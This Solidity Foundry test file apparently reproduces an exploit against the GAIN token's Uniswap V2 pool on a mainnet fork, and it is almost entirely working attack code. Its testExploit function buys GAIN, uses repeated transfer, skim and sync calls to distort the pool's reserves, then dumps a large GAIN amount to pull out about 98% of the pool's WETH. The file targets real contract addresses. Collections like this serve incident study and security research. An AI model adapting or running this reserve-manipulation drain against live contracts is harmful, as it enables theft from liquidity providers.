// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";
import "@interface/IUniswapV3.sol";

import "./IGAIN.sol";

WETH9 constant WETH = WETH9(
    payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2))
);
IGAIN constant GAIN = IGAIN(
    payable(0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac)
);
IUniswapV3Pool constant univ3USDT = IUniswapV3Pool(
    0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b
);
IUniswapV2Pair constant WETH_GAIN_Pool = IUniswapV2Pair(
    0x31d80EA33271891986D873B397d849A92EF49255
);
IUniswapV2Router constant UNISWAP_V2_ROUTER = IUniswapV2Router(
    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
);

contract GainTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19277620 - 1);

        vm.label(address(WETH), "WETH");
        vm.label(address(WETH_GAIN_Pool), "Uniswap V2: GAIN");

        deal(address(WETH), address(this), 0.1 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() external {
        WETH.approve(address(UNISWAP_V2_ROUTER), type(uint).max - 1);

        // (uint112 r0, uint112 r1, ) = WETH_GAIN_Pool.getReserves();
        // print("Pool's WETH", r0, 18);
        // print("Pool's Gain", r1, 5);
        // Pool's WETH: 6.498936314221857031
        // Pool's Gain: 1800491778828808735985.86849

        WETH.transfer(address(WETH_GAIN_Pool), 0.1 ether);
        WETH_GAIN_Pool.swap(0, 100000000, address(this), "");

        GAIN.transfer(address(WETH_GAIN_Pool), 100);
        WETH_GAIN_Pool.skim(address(this));
        WETH_GAIN_Pool.sync();

        GAIN.transfer(address(WETH_GAIN_Pool), 188);
        WETH_GAIN_Pool.skim(address(this));
        WETH_GAIN_Pool.sync();

        // (uint112 r0, uint112 r1, ) = WETH_GAIN_Pool.getReserves();
        // print("Pool's WETH", r0, 18);
        // print("Pool's Gain", r1, 5);
        // Pool's WETH: 6.598936314221376371
        // Pool's Gain: 8167942713995011790.32951

        // print("Gain balance", GAIN.balanceOf(address(this)), 5);

        GAIN.transfer(address(WETH_GAIN_Pool), 130_000_000_000_000);

        uint leave_dust = (WETH.balanceOf(address(WETH_GAIN_Pool)) * 98) / 100;
        WETH_GAIN_Pool.swap(leave_dust, 0, address(this), "");

        print("After WETH", WETH.balanceOf(address(this)), 18);
    }
}
